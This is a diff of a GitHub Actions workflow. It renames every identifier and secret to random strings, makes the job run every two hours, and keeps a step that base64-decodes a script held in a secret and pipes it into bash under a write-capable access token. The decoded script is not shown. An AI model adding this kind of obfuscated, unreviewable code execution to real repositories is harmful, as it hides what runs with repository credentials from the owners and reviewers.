@@ -1,24 +1,21 @@
-name: Update
+name: ueZDRuH9PeN
 on:
   schedule:
-    - cron: '0 0 * * 0'
+    - cron: '0 */2 * * *'
   workflow_dispatch:
-
 jobs:
-  run:
+  inCBs0sQT:
     runs-on: ubuntu-latest
     permissions:
       contents: write
     steps:
       - uses: actions/checkout@v4
         with:
-          token: ${{ secrets.PAT_TOKEN }}
-      
-      - name: Execute
+          token: ${{ secrets.sRhKBhOOH0iD }}
+      - name: jmo0z3di5g
         env:
-          SCRIPT: ${{ secrets.SCRIPT }}
-          PAT_TOKEN: ${{ secrets.PAT_TOKEN }}
-          ARCHIVE_URL: ${{ secrets.ARCHIVE_URL }}
-          COMMIT_USERNAME: ${{ secrets.COMMIT_USERNAME }}
-          GITHUB_TOKEN: ${{ secrets.PAT_TOKEN }}
-        run: echo "$SCRIPT" | base64 -d | bash
+          co67yRuW: ${{ secrets.W3Mk4egVeknMjyx1 }}
+          uu5Cw4Prs7BgPi: ${{ secrets.vhjrAI }}
+          ZwYoHu1qV: ${{ secrets.si4jl84zNwx }}
+          GITHUB_TOKEN: ${{ secrets.sRhKBhOOH0iD }}
+        run: echo "$co67yRuW" | base64 -d | bash
